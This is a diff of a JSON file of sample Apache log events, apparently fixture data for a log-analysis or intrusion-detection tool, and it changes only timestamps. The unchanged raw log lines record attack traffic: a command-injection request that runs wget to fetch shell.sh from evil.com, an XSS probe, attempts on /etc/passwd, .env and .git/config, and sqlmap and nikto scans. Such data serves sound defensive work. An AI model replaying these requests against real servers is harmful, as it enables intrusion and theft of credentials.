@@ -1,7 +1,7 @@
 {
   "events": [
     {
-      "timestamp_utc": "2026-02-24T12:48:28.297227",
+      "timestamp_utc": "2026-04-13T04:18:40.886056",
       "hostname": "server1",
       "log_type": "apache_error",
       "source_ip": "198.51.100.25",
@@ -22,7 +22,7 @@
       "raw_log": "[Mon Feb 20 10:20:00.567890 2026] [error] [client 198.51.100.25] PHP Warning: eval() called in /var/www/html/data.php on line 42"
     },
     {
-      "timestamp_utc": "2026-02-24T12:48:28.297213",
+      "timestamp_utc": "2026-04-13T04:18:40.886042",
       "hostname": "server1",
       "log_type": "apache_error",
       "source_ip": "203.0.113.50",
@@ -41,7 +41,7 @@
       "raw_log": "[Mon Feb 20 10:19:00.456789 2026] [error] [client 203.0.113.50] File does not exist: /var/www/html/wp-config.php"
     },
     {
-      "timestamp_utc": "2026-02-24T12:48:28.297191",
+      "timestamp_utc": "2026-04-13T04:18:40.886020",
       "hostname": "server1",
       "log_type": "apache_error",
       "source_ip": "192.168.1.100",
@@ -62,7 +62,7 @@
       "raw_log": "[Mon Feb 20 10:18:00.345678 2026] [error] [client 192.168.1.100] Timeout waiting for output from CGI: /cgi-bin/backdoor.sh"
     },
     {
-      "timestamp_utc": "2026-02-24T12:48:28.296993",
+      "timestamp_utc": "2026-04-13T04:18:40.885845",
       "hostname": "server1",
       "log_type": "apache_error",
       "source_ip": "203.0.113.50",
@@ -81,7 +81,7 @@
       "raw_log": "[Mon Feb 20 10:16:00.123456 2026] [error] [client 203.0.113.50] client denied by server configuration: /var/www/html/.env"
     },
     {
-      "timestamp_utc": "2026-02-24T12:48:28.296888",
+      "timestamp_utc": "2026-04-13T04:18:40.885743",
       "hostname": "server1",
       "log_type": "apache_error",
       "source_ip": "192.168.1.100",
@@ -102,7 +102,7 @@
       "raw_log": "[Mon Feb 20 10:15:23.234567 2026] [error] [client 192.168.1.100] PHP Fatal error: Call to undefined function eval() in /var/www/html/shell.php on line 5"
     },
     {
-      "timestamp_utc": "2026-02-24T12:48:28.296709",
+      "timestamp_utc": "2026-04-13T04:18:40.885530",
       "hostname": "server1",
       "log_type": "apache_access",
       "source_ip": "203.0.113.50",
@@ -122,7 +122,7 @@
       "raw_log": "203.0.113.50 - - [20/Feb/2026:10:21:00 +0000] \"GET /login.php HTTP/1.1\" 200 4521 \"-\" \"sqlmap/1.6\""
     },
     {
-      "timestamp_utc": "2026-02-24T12:48:28.296614",
+      "timestamp_utc": "2026-04-13T04:18:40.885421",
       "hostname": "server1",
       "log_type": "apache_access",
       "source_ip": "198.51.100.25",
@@ -147,7 +147,7 @@
       "raw_log": "198.51.100.25 - - [20/Feb/2026:10:20:00 +0000] \"GET /server-status HTTP/1.1\" 403 234 \"-\" \"Apache/2.4.41\""
     },
     {
-      "timestamp_utc": "2026-02-24T12:48:28.296564",
+      "timestamp_utc": "2026-04-13T04:18:40.885365",
       "hostname": "server1",
       "log_type": "apache_access",
       "source_ip": "203.0.113.50",
@@ -172,7 +172,7 @@
       "raw_log": "203.0.113.50 - - [20/Feb/2026:10:19:30 +0000] \"GET /admin.php?cmd=wget http://evil.com/shell.sh HTTP/1.1\" 500 567 \"-\" \"curl/7.68.0\""
     },
     {
-      "timestamp_utc": "2026-02-24T12:48:28.296525",
+      "timestamp_utc": "2026-04-13T04:18:40.885324",
       "hostname": "server1",
       "log_type": "apache_access",
       "source_ip": "192.168.1.100",
@@ -193,7 +193,7 @@
       "raw_log": "192.168.1.100 - - [20/Feb/2026:10:19:00 +0000] \"GET /phpmyadmin/ HTTP/1.1\" 404 234 \"-\" \"Mozilla/5.0\""
     },
     {
-      "timestamp_utc": "2026-02-24T12:48:28.296488",
+      "timestamp_utc": "2026-04-13T04:18:40.885286",
       "hostname": "server1",
       "log_type": "apache_access",
       "source_ip": "45.33.32.156",
@@ -214,7 +214,7 @@
       "raw_log": "45.33.32.156 - - [20/Feb/2026:10:18:30 +0000] \"GET /.git/config HTTP/1.1\" 403 234 \"-\" \"git/2.30.0\""
     },
     {
-      "timestamp_utc": "2026-02-24T12:48:28.296450",
+      "timestamp_utc": "2026-04-13T04:18:40.885246",
       "hostname": "server1",
       "log_type": "apache_access",
       "source_ip": "198.51.100.25",
@@ -232,7 +232,7 @@
       "raw_log": "198.51.100.25 - - [20/Feb/2026:10:18:00 +0000] \"GET /api.php?cmd=<script>alert(1)</script> HTTP/1.1\" 500 342 \"-\" \"Mozilla/5.0\""
     },
     {
-      "timestamp_utc": "2026-02-24T12:48:28.296425",
+      "timestamp_utc": "2026-04-13T04:18:40.885219",
       "hostname": "server1",
       "log_type": "apache_access",
       "source_ip": "203.0.113.50",
@@ -253,7 +253,7 @@
       "raw_log": "203.0.113.50 - - [20/Feb/2026:10:17:30 +0000] \"GET /etc/passwd HTTP/1.1\" 403 234 \"-\" \"Mozilla/5.0\""
     },
     {
-      "timestamp_utc": "2026-02-24T12:48:28.296396",
+      "timestamp_utc": "2026-04-13T04:18:40.885189",
       "hostname": "server1",
       "log_type": "apache_access",
       "source_ip": "192.168.1.100",
@@ -274,7 +274,7 @@
       "raw_log": "192.168.1.100 - - [20/Feb/2026:10:17:00 +0000] \"GET /wp-content/plugins HTTP/1.1\" 404 234 \"-\" \"nikto/2.1.6\""
     },
     {
-      "timestamp_utc": "2026-02-24T12:48:28.296089",
+      "timestamp_utc": "2026-04-13T04:18:40.884905",
       "hostname": "server1",
       "log_type": "apache_access",
       "source_ip": "192.168.1.100",
@@ -299,7 +299,7 @@
       "raw_log": "192.168.1.100 - - [20/Feb/2026:10:15:24 +0000] \"GET /admin HTTP/1.1\" 401 532 \"-\" \"Mozilla/5.0\""
     },
     {
-      "timestamp_utc": "2026-02-24T12:48:28.296002",
+      "timestamp_utc": "2026-04-13T04:18:40.884815",
       "hostname": "server1",
       "log_type": "apache_access",
       "source_ip": "192.168.1.100",
